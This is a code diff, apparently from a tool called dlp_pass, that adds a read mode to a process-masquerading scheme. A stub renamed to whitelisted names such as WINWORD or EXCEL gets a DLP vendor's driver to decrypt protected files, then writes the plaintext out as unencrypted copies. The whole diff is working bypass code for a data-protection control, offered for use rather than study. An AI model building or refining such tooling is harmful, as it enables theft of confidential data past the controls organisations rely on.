@@ -2,13 +2,21 @@
 
 流程（与原脚本保持一致）
 -----------------------
-1. 用当前 Python 进程读取源文件，得到已解密的明文内存流；
+1. 用当前 Python 进程读取源文件，得到已解密的明文内存流；读到原始密文时
+   委派白名单进程读取（伪装进程 -> cmd -> python，见 :mod:`dlp_pass.core.source_reader`）；
 2. 从本地映射表（mappings/ 当前版本）取该后缀对应的伪装进程队列（主进程 -> 备用进程）；
 3. 复用 / 构建伪装进程，将明文流经 stdin 写入 ``*.pass`` 临时文件；
 4. 将 ``*.pass`` 重命名为最终文件（等价于原脚本的 ``move /y``）；
 5. 用 PowerShell（非白名单视角）校验输出文件是否仍呈密文特征
    （标识串命中或后缀应有明文签名缺失），
    若仍为密文则删除输出并尝试下一个备用进程。
+
+读取端与写出端共用伪装进程（v2.5.1，issue #1）
+----------------------------------------------
+艾特盾等厂商的驱动只对客户端显式授权的进程名（WINWORD / EXCEL 等）解密，
+cmd / python 读回的是与磁盘一致的密文。因此解密前先取映射进程队列，
+以常驻伪装会话（改名后的 ``writer_stub``，协议含读模式）读取明文，
+同一会话随后继续用于写盘，避免重复创建进程。
 
 批处理进程复用（性能优化）
 --------------------------
@@ -51,11 +59,13 @@ CancelCallback = Callable[[], bool]
 
 
 class _WriterSession:
-    """常驻伪装进程会话：同一进程串行处理多个文件的落盘请求。
+    """常驻伪装进程会话：同一进程串行处理多个文件的读取 / 落盘请求。
 
     协议（与 ``packaging/writer_stub.py`` 的批处理模式对应）：
-    请求为一行 ``<base64 路径> <字节数>`` 加紧跟其后的原始数据，
+    写请求为一行 ``<base64 路径> <字节数>`` 加紧跟其后的原始数据，
     应答为 ``OK``（成功）或 ``ERR <base64 消息>``（失败）；
+    读请求为一行 ``<base64 路径> -1``，应答 ``OK <n>`` 加紧跟的 n 字节
+    文件内容（DLP 驱动为该伪装进程名解密后的明文视角）；
     关闭 stdin（EOF）即通知子进程退出。
     """
 
@@ -88,11 +98,31 @@ class _WriterSession:
         if reply == b"OK":
             return True, ""
         if reply.startswith(b"ERR "):
-            try:
-                return False, base64.b64decode(reply[4:]).decode("utf-8", "replace")
-            except Exception:
-                return False, "伪装进程写盘失败（错误信息无法解析）"
+            return False, _decode_err(reply)
         return False, "伪装进程未确认写盘（可能已退出）"
+
+    def read_file(self, source: Path) -> bytes | None:
+        """请求伪装进程读取 ``source``（白名单进程明文视角）；失败返回 None。"""
+        if not self.is_alive():
+            return None
+        assert self._proc.stdin is not None and self._proc.stdout is not None
+        header = base64.b64encode(os.fsencode(str(source)))
+        header += b" -1\n"
+        try:
+            self._proc.stdin.write(header)
+            self._proc.stdin.flush()
+            reply = self._proc.stdout.readline().strip()
+            if not reply.startswith(b"OK "):
+                if reply.startswith(b"ERR "):
+                    _logger.debug("伪装进程读取失败 [%s]: %s", source.name, _decode_err(reply))
+                return None
+            size = int(reply.split()[1])
+            return _read_exact(self._proc.stdout, size)
+        except (OSError, ValueError) as exc:
+            _logger.debug("伪装进程读取通信失败 [%s]: %s", source.name, exc)
+            # 流状态可能已错位，后续请求不可信，主动结束会话
+            self.close()
+            return None
 
     def close(self) -> None:
         """关闭 stdin 通知子进程退出；超时未退出则强制终止。"""
@@ -118,6 +148,27 @@ class _WriterSession:
             pass
 
 
+def _decode_err(reply: bytes) -> str:
+    """解析伪装进程 ``ERR <base64 消息>`` 应答中的错误说明。"""
+    try:
+        return base64.b64decode(reply[4:]).decode("utf-8", "replace")
+    except Exception:
+        return "伪装进程返回的错误信息无法解析"
+
+
+def _read_exact(stream, size: int) -> bytes:
+    """从字节流读取恰好 ``size`` 个字节，不足时抛出 EOFError。"""
+    chunks = []
+    remaining = size
+    while remaining > 0:
+        chunk = stream.read(min(remaining, 1 << 20))
+        if not chunk:
+            raise EOFError("伪装进程输出在数据读取完成前中断")
+        chunks.append(chunk)
+        remaining -= len(chunk)
+    return b"".join(chunks)
+
+
 class DecryptService:
     """单个文件的解密导出服务（批处理下按后缀复用常驻伪装进程）。"""
 
@@ -131,7 +182,7 @@ class DecryptService:
         self._mapping = mapping
         self._verifier = verifier
         self._writers = writer_factory
-        # 源读取器：发布版进程非 DLP 白名单时自动委派 cmd / python 读取明文
+        # 源读取器：发布版进程非 DLP 白名单时委派伪装进程 / cmd / python 读取明文
         self._reader = source_reader or SourceReader()
         # 当前后缀分组内已启动的常驻伪装进程会话（进程名 -> 会话）
         self._sessions: dict[str, _WriterSession] = {}
@@ -165,9 +216,19 @@ class DecryptService:
                 task.source, task.output, task.suffix, task.in_place, self._mapping.version,
             )
 
+        # 先取伪装进程队列：读取端与写出端共用同一批常驻会话（v2.5.1）
+        process_queue = self._mapping.get_process_queue(task.suffix)
+        if is_debug_enabled():
+            _logger.debug("进程队列 [%s]: %s", task.suffix, process_queue)
+
         emit(f"正在读取源文件内存流: {task.source.name}")
         try:
-            raw_bytes = self._reader.read(task.source)
+            raw_bytes = self._reader.read(
+                task.source,
+                process_queue=process_queue,
+                acquire_session=self._ensure_session,
+                log=emit,
+            )
         except Exception as exc:
             outcome.error = f"内存读取失败: {exc}"
             if is_debug_enabled():
@@ -182,9 +243,6 @@ class DecryptService:
             )
         emit(f"内存读取成功，文件大小: {len(raw_bytes)} 字节")
 
-        process_queue = self._mapping.get_process_queue(task.suffix)
-        if is_debug_enabled():
-            _logger.debug("进程队列 [%s]: %s", task.suffix, process_queue)
         for index, proc_name in enumerate(process_queue, 1):
             if cancelled():
                 outcome.cancelled = True
@@ -227,14 +285,12 @@ class DecryptService:
         for session in sessions.values():
             session.close()
 
-    def _export_with_process(
-        self,
-        raw_bytes: bytes,
-        proc_name: str,
-        final_file: Path,
-        emit: LogCallback,
-        in_place: bool = False,
-    ) -> tuple[bool, str]:
+    def _ensure_session(self, proc_name: str) -> _WriterSession | None:
+        """取得（必要时创建 / 重建）指定进程名的常驻伪装会话；失败返回 None。
+
+        读取端（:class:`~dlp_pass.core.source_reader.SourceReader`）与写出端
+        共用本方法：同一后缀分组内 WINWORD 等伪装进程只启动一次。
+        """
         session = self._sessions.get(proc_name)
         if session is not None and not session.is_alive():
             _logger.debug("常驻伪装进程 [%s] 已退出，重建会话", proc_name)
@@ -244,17 +300,32 @@ class DecryptService:
             try:
                 writer_exe = self._writers.get_writer(proc_name)
             except Exception as exc:
-                emit(f"打包伪装进程 [{proc_name}] 失败: {exc}")
-                return False, f"构建失败: {exc}"
+                _logger.warning("打包伪装进程 [%s] 失败: %s", proc_name, exc)
+                return None
             try:
                 session = _WriterSession(writer_exe)
             except Exception as exc:
-                return False, f"伪装进程启动失败: {exc}"
+                _logger.warning("伪装进程 [%s] 启动失败: %s", proc_name, exc)
+                return None
             self._sessions[proc_name] = session
             if is_debug_enabled():
                 _logger.debug("伪装进程已启动: %s（目标 %s.exe）", writer_exe, proc_name)
         elif is_debug_enabled():
             _logger.debug("复用常驻伪装进程会话: %s", proc_name)
+        return session
+
+    def _export_with_process(
+        self,
+        raw_bytes: bytes,
+        proc_name: str,
+        final_file: Path,
+        emit: LogCallback,
+        in_place: bool = False,
+    ) -> tuple[bool, str]:
+        session = self._ensure_session(proc_name)
+        if session is None:
+            emit(f"伪装进程 [{proc_name}.exe] 不可用（构建 / 启动失败，详见日志）")
+            return False, "伪装进程不可用"
 
         pass_file = final_file.parent / f"{final_file.name}.pass"
         try:
